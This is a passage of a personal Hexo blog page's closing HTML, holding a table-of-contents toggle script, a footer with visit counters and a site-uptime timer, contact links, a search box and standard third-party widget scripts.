            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>



    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2020</span>
            <a href="https://lnng.top" target="_blank">Lmg</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
             <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-heart-o"></i> 本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>   <span id="busuanzi_container_site_uv" style='display:none'></span> 人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人. 

            <br>
            
            <span id="sitetime">载入运行时间...</span>

            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2020";
                    var startMonth = "3";
                    var startDate = "22";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }

                setInterval(siteTime, 1000);
            </script>

            
            <script src="https://pv.sohu.com/cityjson?ie=utf-8"></script> 
            <script type="text/javascript">  
            document.write('欢迎来自:' + returnCitySN["cname"]+'的朋友' + ",您的IP:" + returnCitySN["cip"] + ",浏览器版本:"+getBrowserInfo());
        function getBrowserInfo()
{
    var agent = navigator.userAgent.toLowerCase() ;
    var regStr_ie = /msie [\d.]+;/gi ;
    var regStr_ff = /firefox\/[\d.]+/gi
    var regStr_chrome = /chrome\/[\d.]+/gi ;
    var regStr_saf = /safari\/[\d.]+/gi ;
    //IE
    if(agent.indexOf("msie") > 0)
    {
        return agent.match(regStr_ie) ;
    }
    //firefox
    if(agent.indexOf("firefox") > 0)
    {
        return agent.match(regStr_ff) ;
    }
    //Chrome
    if(agent.indexOf("chrome") > 0)
    {
        return agent.match(regStr_chrome) ;
    }
    //Safari
    if(agent.indexOf("safari") > 0 && agent.indexOf("chrome") < 0)
    {
        return agent.match(regStr_saf) ;
    }
}
</script> 

            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Lmg66" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1589862745@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1589862745" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1589862745" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>

<!-- <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script> -->

<!-- <script src="/js/cursor.js"></script> -->
    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    

    
    
    
    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/instantpage/instantpage.js" type="module"></script>
    
    <script type="text/javascript">
    var OriginTitile=document.title,st;
    document.addEventListener("visibilitychange",function(){
        document.hidden?(document.title="ヽ(●-`Д´-)ノ404啦",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ骗你的嘿嘿！",st=setTimeout(function(){document.title=OriginTitile},3e3))
    })

</script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
